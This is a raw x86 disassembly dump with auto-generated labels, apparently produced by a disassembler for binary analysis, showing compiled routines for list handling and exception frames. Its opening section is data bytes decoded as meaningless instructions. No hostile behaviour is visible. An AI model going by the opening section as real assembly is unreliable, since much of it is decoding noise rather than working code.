xor [ eax ] eax
call 0x44415cda
pop esi
inc ecx
add [ esp + edx * 2 + 0x55000041 ] dh
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_411df3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add al dl
push ds
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffff9c415fae
inc ecx
add [ edi + ebx * 2 ] al
inc ecx
add ah bh
inc ecx
add [ eax ] dh
inc cx
add [ ecx + ebp * 2 + 0x41 ] al
add [ eax ] ah
inc ecx
add [ eax + ecx * 4 + 0x41 ] cl
add [ eax + 0x67 ] al
inc ecx
add [ ecx + ecx * 4 ] bl
inc ecx
add [ ecx + ecx * 4 ] al
inc ecx
add [ eax + 0xe004176 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx 0x7c00411f
rcl [ eax ] 0x20
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
and [ ecx ] al
or al 0x0
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx ] ch
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x64004010 ] ah
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffffdc415f4a
pop esi
inc ecx
add [ edi + ebx * 2 ] al
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ esi ] al
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x411f8090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x411f ] ch
jb r-xdata
add [ eax ] bl
add [ eax ] al
add [ ecx + edx + 0x34640040 ] dl
inc eax
add [ eax ] ch
push esi
inc eax
add [ esi + edx * 2 ] dh
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ esi + edx * 2 + 0x40 ] al
add al ch
xor [ eax ] eax
xor al 0x9d
inc ecx
add [ ebp + ebx * 4 + 0x41 ] ch
add ah dl
popfd
inc ecx
add [ esi + ebx * 4 ] bh
inc ecx
add al al
sahf
inc ecx
add [ edi + ebx * 4 ] ah
inc ecx
add [ ecx ] ah
inc ecx
add [ eax ] dh
mov eax [ 0xffffffffa13c0041 ]
inc ecx
add [ eax - 0x5f ] cl
inc ecx
add [ ecx + 0x41 ] dl
add al dl
mov eax [ 0x540e0041 ]
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
inc ecx
rcr [ esi ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
push ds
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x64004010 ] ah
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x1c415eee
inc ecx
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7c00411f ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x1f
inc ecx
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ edi + ebx ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4123e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405dbc
pop edi
pop esi
pop ebx
retn
sub_41240c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405da0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412434
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405dc4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41252c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_413840
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403448
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403448
test al al
je r-xdata
sub_41258c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_41252c
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41252c
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403448
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4125fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_4136e4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_412678
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
mov eax [ esi + 0x4 ]
call sub_403234
mov eax [ esi + 0x8 ]
call sub_403234
mov eax [ esi + 0xc ]
call sub_403234
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4126b8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_413840
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403198
test al al
jne r-xdata
sub_412718
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_413840
mov edx eax
mov eax ebp
call sub_403448
test al al
jne r-xdata
sub_41275c
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4126b8
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4136e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4127fe
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
sub_41281c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404f60
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_41283c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413840
mov edx edi
call sub_41281c
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413840
mov edx edi
call sub_41281c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413730
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_41281c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413730
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4128e0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_413840
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_412718
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_41292c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4125fc
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4136e4
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4129a0
push ebx
push esi
push edi
push ebp
call sub_4035a8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403590
mov eax [ esi + 0x4 ]
mov edx edi
call sub_413840
call sub_403234
inc edi
dec ebp
jne r-xdata
sub_4129fc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_413840
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_41258c
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_412a40
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4126b8
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_413840
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_412a84
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403184
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b0e
lea eax [ ebp - 0x10c ]
call sub_403f6c
retn
sub_412b14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4129fc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412520
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_412a84
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_413840
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413840
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403448
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4129fc
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413730
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4136e4
sub_412c00
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413840
mov edx ebp
call sub_412804
test al al
jne r-xdata
sub_412c44
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4125fc
mov edx eax
mov eax [ edi + 0x4 ]
call sub_4136e4
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413840
mov eax [ eax + 0xc ]
mov edx ebp
call sub_41389c
test eax eax
jge r-xdata
sub_412ca0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413840
mov esi eax
mov edx ebp
mov eax esi
call sub_41283c
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403234
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413730
sub_412cf0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_412bdc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412df6
mov eax [ rw-data ]
call sub_412c94
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4136e4
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413840
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412718
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4136e4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413840
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_412df6
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_412e1c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_412e4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_412bdc
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_412c94
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a54
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413840
mov edx [ ebp - 0x4 ]
call sub_4126b8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_412ee0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f47
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_412f4c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bdc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412a40
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f99
mov eax [ rw-data ]
call sub_412c94
retn
sub_412fa0
push ebx
push esi
mov esi eax
mov eax esi
call sub_412f4c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_412ee0
sub_412fc0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bdc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412c00
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412be8
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41302c
mov eax [ rw-data ]
call sub_412c94
retn
mov eax ebx
call sub_4031c0
mov ebx eax
sub_413030
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bdc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412ca0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413079
mov eax [ rw-data ]
call sub_412c94
retn
sub_41307c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bdc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412c44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130c5
mov eax [ rw-data ]
call sub_412c94
retn
sub_4130c8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_412bdc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_412b14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413116
mov eax [ rw-data ]
call sub_412c94
retn
sub_41311c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bdc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_4128e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413171
mov eax [ rw-data ]
call sub_412c94
retn
sub_4131d0
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403540
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_413208
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4131d0
mov edx eax
mov eax [ rw-data ]
call sub_413b24
pop edi
pop esi
pop ebx
retn
sub_413234
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413bac
mov esi eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c10
retn
mov edx ebx
mov eax esi
call sub_413840
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a54
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4132b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407b48
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4132f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403fc0
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413334
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_41389c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ rw-data ] eax
pop esi
pop ebx
retn
